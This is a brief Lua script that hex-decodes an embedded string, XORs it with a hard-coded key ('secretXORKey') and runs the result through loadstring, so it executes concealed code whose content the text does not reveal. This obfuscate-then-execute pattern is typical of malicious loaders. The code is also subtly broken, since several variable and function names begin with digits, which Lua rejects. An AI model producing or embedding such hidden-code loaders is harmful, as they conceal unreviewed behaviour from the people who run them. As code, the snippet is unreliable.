local omjbinaxbyj = "253d2d1e6196d27301c301e2336221b3f2c3c2281361030c22152c3719281bd1152a8b47462b28218241029835413f1a3c231b2ca323a2622152c37192830c5c11292d2d42619343a832d172a32521e2a1f307f3632731293d321d2c19307f363244f3f1c5a1e4471639362620c162df44294423f31792b162656311e3c23202331222ca3a2d31b123d3f191829"
    local function 66rn6cf9lq()
      local 74mxh04f9wj = ""
      for i = 1, #omjbinaxbyj, 2 do
        local byte = tonumber(omjbinaxbyj:sub(i, i + 1), 16)
        74mxh04f9wj = 74mxh04f9wj .. string.char(byte)
      end
      local xorKey = "secretXORKey"
      local decoded = ""
      for i = 1, #74mxh04f9wj do
        decoded = decoded .. string.char(74mxh04f9wj:byte(i) ~ xorKey:byte((i-1)%#xorKey+1))
      end
      return decoded
    end

    local decodedScript = loadstring(66rn6cf9lq())()
    print(decodedScript)
  